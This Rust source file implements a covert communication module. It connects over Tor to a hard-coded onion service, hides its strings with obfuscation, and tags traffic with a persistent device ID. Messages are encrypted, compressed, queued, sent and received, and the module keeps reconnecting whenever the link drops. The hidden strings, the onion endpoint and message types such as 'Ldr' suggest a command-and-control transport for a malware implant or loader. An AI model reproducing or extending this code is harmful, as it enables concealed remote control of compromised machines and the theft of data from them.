use std::{
    collections::VecDeque,
    future::Future,
    io::Cursor,
    path::PathBuf,
    sync::Arc,
    time::Duration,
};
use byteorder::{ ByteOrder, LittleEndian };

use anyhow::{ Context, Result };
use arti_client::{ DataStream, StreamPrefs, TorClient, TorClientConfig };
use obfstr::obfstr as s;
use crate::{
    ref_err,
    ref_info,
    ref_tag,
    utils::{ encryption::sauron_encrypt, functions::fetch_constant_device_id },
};
use flate2::read::ZlibDecoder;
use flate2::write::ZlibEncoder;
use flate2::Compression;
use std::io::{ Read, Write, BufReader, BufWriter };
use crate::{
    constants::{ communication_encryption_key, onion_endpoint },
    logs::logger::Logger,
    utils::encryption::{ convert_key_to_bytes, sauron_decrypt },
};
use tokio::{
    io::{ AsyncReadExt, AsyncWriteExt },
    sync::{ Mutex, RwLock },
    time::{ interval, timeout },
};
use serde::{ Deserialize, Serialize };
use crate::ref_log_internal;

pub type RwPtr<T> = Arc<RwLock<T>>;
pub type MutexPtr<T> = Arc<Mutex<T>>;

pub type SendQueue = VecDeque<Vec<u8>>;

#[derive(Clone)]
pub struct TrHandler {
    // pub logger: MutexPtr<Option<Logger>>,
    pub dv_id: RwPtr<String>,
    tr_clnt: MutexPtr<TorClient<tor_rtcompat::PreferredRuntime>>,
    stream_prefs: RwPtr<StreamPrefs>,
    stream: MutexPtr<Option<DataStream>>,
    send_queue: MutexPtr<SendQueue>,
    pub queue_tick_interval_ms: RwPtr<u64>,
    retry_connect_interval_ms: RwPtr<u64>,
    retry_read_stream_interval_ms: RwPtr<u64>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ServerReceive {
    pub server_receive_type: SrvRcvTp,
    pub data: Vec<u8>,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum SrvRcvTp {
    Ldr,
    Bgm,
}
pub enum LoggerCnfg {
    Existing(Option<Logger>),
    New {
        log_dir: PathBuf,
        log_enc_key: String,
    },
}
impl TrHandler {
    pub async fn new() -> Result<Self> {
        let config = TorClientConfig::default();
        let tor_client = TorClient::create_bootstrapped(config).await.context(
            s!("Failed to create Tor client").to_string()
        )?;
        let mut stream_prefs: StreamPrefs = StreamPrefs::default();

        stream_prefs.connect_to_onion_services(arti_client::config::BoolOrAuto::Explicit(true));

        let tor_handler = TrHandler {
            stream: Arc::new(Mutex::new(None)),
            dv_id: Arc::new(RwLock::new(fetch_constant_device_id())),
            send_queue: Arc::new(Mutex::new(VecDeque::new())),
            // logger: Arc::new(Mutex::new(logger)),
            tr_clnt: Arc::new(Mutex::new(tor_client)),
            stream_prefs: Arc::new(RwLock::new(stream_prefs)),
            retry_connect_interval_ms: Arc::new(RwLock::new(1 * 3 * 1000)), // 3 secs
            retry_read_stream_interval_ms: Arc::new(RwLock::new(100)),
            queue_tick_interval_ms: Arc::new(RwLock::new(10)),
        };

        Ok(tor_handler)
    }
    pub async fn connect_to_endpoint(&mut self) -> Result<()> {
        let tor_client = self.tr_clnt.lock().await;
        let stream_prefs = self.stream_prefs.read().await;
        let mut stream = tor_client.connect_with_prefs(
            (onion_endpoint(), 80),
            &stream_prefs
        ).await?;

        stream.wait_for_connection().await?;

        let mut stream_guard = self.stream.lock().await;
        *stream_guard = Some(stream);

        Ok(())
    }
    pub async fn run<ReceiveCallbackFunc, ConnectCallbackFunc, ParentType>(
        &mut self,
        parent_self_ref: Arc<RwLock<ParentType>>,
        receive_callback: ReceiveCallbackFunc,
        connect_callback: ConnectCallbackFunc
    )
        where
            ReceiveCallbackFunc: Fn(Arc<RwLock<ParentType>>, Vec<u8>) +
                Send +
                Sync +
                Clone +
                'static,
            ConnectCallbackFunc: Fn(Arc<RwLock<ParentType>>) + Send + Sync + Clone + 'static
    {
        // CC: FnMut() + Send + Sync + Clone + 'static,
        let self_clone = self.clone();
        // ref_info!(
        //     self.logger.lock().await.as_ref().expect("no logger"),
        //     "SPAWNING SEND QUEUE TASK"
        // );
        tokio::task::spawn(async move { self_clone.send_queue_task().await });
        // ref_info!(self.logger.lock().await.as_ref().expect("no logger"), "SPAWNED");
        loop {
            // ref_info!(
            //     self.logger.lock().await.as_ref().expect("no logger"),
            //     "RUNNING self.connect_to_endpoint()"
            // );
            // // println!("connecting");
            match self.connect_to_endpoint().await {
                Ok(()) => {
                    // should send connect callback
                    // ref_info!(
                    //     self.logger.lock().await.as_ref().expect("no logger"),
                    //     "connect_callback calling"
                    // );
                    connect_callback(parent_self_ref.clone());
                    // ref_info!(
                    //     self.logger.lock().await.as_ref().expect("no logger"),
                    //     " connect_callback() DONE"
                    // );

                    loop {
                        if
                            let Err(_error) = self.poll_receive(
                                parent_self_ref.clone(),
                                receive_callback.clone()
                            ).await
                        {
                            // so we will try reconnect to endpoint again after interval
                            break;
                        }
                        tokio::time::sleep(
                            Duration::from_millis(
                                self.retry_read_stream_interval_ms.read().await.to_owned()
                            )
                        ).await;
                    }
                }
                Err(error) => {
                    // eprintln!("Failed to connect_to_endpoint: {}", error);
                    // ref_err!(
                    //     self.logger.lock().await.as_ref().expect("no logger"),
                    //     "Failed to connect_to_endpoint, timeouting retry"
                    // );
                }
            }
            // ref_info!(
            //     self.logger.lock().await.as_ref().expect("no logger"),
            //     "STARTING RETRY CONNECT SLEEP"
            // );
            tokio::time::sleep(
                Duration::from_millis(self.retry_connect_interval_ms.read().await.to_owned())
            ).await;
        }
    }
    async fn poll_receive<RC, CT>(
        &self,
        parent_self_ref: Arc<RwLock<CT>>,
        callback: RC
    ) -> Result<()>
        where RC: Fn(Arc<RwLock<CT>>, Vec<u8>) + Send + Sync + Clone + 'static
    {
        loop {
            let data = match self.read_data().await {
                Ok(data) => data,
                Err(error) => {
                    // // e// println!("read_data error: {}", error);
                    if
                        error.to_string().contains("Stream is closed") ||
                        error.to_string().contains("Stream not connected")
                    {
                        self
                            .get_stream().await?
                            .lock().await
                            .as_mut()
                            .context(s!("DataStream is None").to_owned())?
                            .shutdown().await?;
                        return Ok(());
                    }
                    continue;
                }
            };

            let parent_clone = parent_self_ref.clone();
            // ref_info!(
            //     self.logger.lock().await.as_ref().expect("no logger"),
            //     "running data callback"
            // );
            callback(parent_clone.clone(), data);
        }
    }

    async fn read_data(&self) -> Result<Vec<u8>> {
        let stream_ref = self.get_stream().await?;

        // it will wait indef until receives something, holding the lock - so we check the queue periodically and if theres something in the queue - we timeout read length
        // because it should be instant - we timeout 100ms and if nothing comes we unlock the stream it should be transferred to queue

        let data_length: u32;
        loop {
            let mut shell_guard = stream_ref.lock().await;
            let stream = shell_guard.as_mut().context(s!("DataStream is None").to_owned())?;

            // in here we timeout read u32le, honestly just timeout 50ms and loop, enough time for other thread to lock for writing?
            let mut buf = [0; 4];
            match timeout(Duration::from_millis(50), stream.read_exact(&mut buf)).await {
                Ok(result) => {
                    data_length = match result {
                        Ok(_) => { LittleEndian::read_u32(&buf) }
                        Err(error) => {
                            if error.kind() == std::io::ErrorKind::UnexpectedEof {
                                // Stream is closed
                                return Err(anyhow::anyhow!(s!("Stream is closed").to_owned()));
                            } else {
                                return Err(
                                    anyhow::anyhow!(
                                        format!("{}{}", s!("Error trying to read: "), error)
                                    )
                                );
                            }
                        }
                    };
                    // break loop when we read the data
                    break;
                }
                Err(error) => {
                    // // println!("timeout elapsed: {}", error);
                    //? in here we should check if the queue has something only then unlock and sleep
                    drop(shell_guard);
                    tokio::time::sleep(Duration::from_millis(20)).await;
                }
            }
        }
        // ref_info!(
        //     self.logger.lock().await.as_ref().expect("no logger"),
        //     "data_length: ",
        //     data_length
        // );

        let mut data_buf = vec![0; data_length as usize];

        let mut shell_guard = stream_ref.lock().await;
        let stream = shell_guard.as_mut().context(s!("DataStream is None").to_owned())?;
        // if we received data length we will lock indef until we read that length - so if theres errors GG

        stream
            .read_exact(&mut data_buf).await
            .context(s!("Failed to read exact data from stream").to_string())?;

        let mut decoder = ZlibDecoder::new(Cursor::new(data_buf));
        let mut decompressed = Vec::new();
        decoder
            .read_to_end(&mut decompressed)
            .context(s!("Failed to decoder.read_to_end").to_owned())?;

        Ok(decompressed)
    }

    async fn send_queue_task(&self) -> ! {
        let mut interval = interval(
            Duration::from_millis(self.queue_tick_interval_ms.read().await.to_owned())
        );
        loop {
            interval.tick().await;
            let mut queue = self.send_queue.lock().await;
            while let Some(data) = queue.pop_front() {
                // ref_info!(
                //     self.logger.lock().await.as_ref().expect("no logger"),
                //     "QUEUE RECEIVED SENDING"
                // );

                if let Err(error) = self.encrypt_compress_and_send(&data).await {
                    // ref_err!(
                    //     self.logger.lock().await.as_ref().expect("no logger"),
                    //     "Failed to encrypt_and_send: ",
                    //     error
                    // );
                }
            }
        }
    }
    pub async fn add_to_send_queue(
        &self,
        server_receive_type: SrvRcvTp,
        data: Vec<u8>
    ) -> Result<()> {
        let send = ServerReceive { server_receive_type, data };
        let binary_data = serde_json
            ::to_vec(&send)
            .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;
        self.send_queue.lock().await.push_back(binary_data);
        // ref_info!(
        //     self.logger.lock().await.as_ref().expect("no logger"),
        //     "added data to sent queue"
        // );
        Ok(())
    }
    async fn encrypt_compress_and_send(&self, data: &[u8]) -> Result<()> {
        let encrypted_data = sauron_encrypt(
            convert_key_to_bytes(&communication_encryption_key()),
            data
        )?;

        let mut encoder = ZlibEncoder::new(Vec::new(), Compression::new(5));
        encoder.write_all(&encrypted_data).context(s!("Failed to encoder.write_all").to_owned())?;

        let compressed = encoder.finish().context(s!("Failed to encoder.finish").to_owned())?;
        // // println!("encrypted and compressed data len: {}", compressed.len());
        self.send_data(&compressed).await
    }
    async fn send_data(&self, data: &[u8]) -> Result<()> {
        let read_stream_ref = self.get_stream().await?;

        let mut shell_guard = read_stream_ref.lock().await;
        // // println!("send_data got stream unlocked");

        let stream = shell_guard.as_mut().context(s!("DataStream is None").to_owned())?;
        stream
            .write_all(&(data.len() as u32).to_le_bytes()).await
            .context(s!("Failed to write length of data to stream").to_string())?;
        stream
            .write_all(&data).await
            .context(s!("Failed to write the data to stream").to_string())?;
        stream.flush().await.context(s!("Failed to flush stream").to_string())?;
        // // println!("flushed");

        Ok(())
    }
    async fn get_stream(&self) -> Result<MutexPtr<Option<DataStream>>> {
        if self.stream.lock().await.is_some() {
            Ok(self.stream.clone())
        } else {
            Err(anyhow::anyhow!(s!("Data Stream not initialized").to_string()))
        }
    }
}
